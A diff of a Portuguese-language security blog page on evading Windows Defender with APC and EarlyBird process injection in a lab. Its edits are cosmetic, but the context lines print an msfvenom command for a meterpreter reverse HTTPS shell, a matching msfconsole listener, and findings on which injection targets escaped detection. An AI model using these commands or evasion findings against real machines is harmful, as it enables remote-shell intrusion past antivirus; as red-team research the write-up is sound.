@@ -109,7 +109,7 @@
       "inLanguage": "en",
       "datePublished": "2022-08-01",
       "dateModified": "2022-08-01",
-      "wordCount" : "3536",
+      "wordCount" : "3529",
       "publisher": {
         "@type": "Person",
         "name": "Midnight Reverser"
@@ -766,18 +766,18 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 
   <h2 id="evadindo-windows-defender-com-injeções-apc"><a class="anchor" href="#evadindo-windows-defender-com-injeções-apc" title='Anchor for: Evadindo Windows Defender com injeções APC.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Evadindo Windows Defender com injeções APC</h2> 
 
-<p>Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud Delivery Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um <em>wrapper</em> para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:</p>
+<p>Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud-delivered Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um <em>wrapper</em> para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:</p>
 <ul>
 <li>Detecção de ambientes Sandbox para evasão de Antivírus, via <code>GetSystemTime</code> (delay de 10 segundos na execução). Caso uma sandbox seja detectada, o processo deverá encerrar;</li>
 <li>Evasão de assinaturas com uso de encoder ROT7 para armazenar o shellcode no injetor. O código do ofuscador ROT7 está disponível no <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeObfuscator">Github</a>, sendo apenas necessário alterar a variável global &ldquo;shellcode&rdquo; para o shellcode gerado.</li>
 </ul>
 <p>O Shellcode Runner é nosso teste de controle, e os demais serão colocados à prova com relação à sua efetividade de acordo com a detecção/bloqueio recebidas no laboratório controlado.</p>
 <blockquote>
-<p>Comando utilizado para gerar shell reversa x64 staged HTTPS do meterpreter ofuscada com o encoder x64/xor:</p>
+<p>Comando utilizado para gerar shell reversa x64 staged HTTPS do meterpreter:</p>
 <ul>
 <li><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.2 LPORT=443 EXITFUNC=thread -f c</code></li>
 </ul>
-<p>Comando para criar um listener no meterpreter</p>
+<p>Comando para criar um listener no meterpreter:</p>
 <ul>
 <li><code>msfconsole -x &quot;use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit&quot;</code></li>
 </ul>
@@ -1075,7 +1075,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 
   <h2 id="conclusão"><a class="anchor" href="#conclusão" title='Anchor for: Conclusão.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Conclusão</h2> 
 
-<p>O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud Delivery Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.</p>
+<p>O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud-delivered Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.</p>
 <p>Não houve detecção do injetor, nem do conteúdo injetado, apenas bloqueio por comportamento de certas funcionalidades (como o comando shell) do meterpreter quando ele foi injetado no <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
 <p>Esse problema foi mitigado ao utilizarmos como alvo o arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code>.</p>
 <p>É importante ressaltar que é possível gerar um shellcode para o EarlyBird que não é detectado ao ser injetado no <em>explorer.exe</em> ou <em>svchost.exe</em> - no msfvenom, executando novamente o comando para gerar um shellcode pode ser o suficiente. Muitos shellcodes foram gerados, e alguns deles funcionavam 100% nesses dois arquivos.</p>
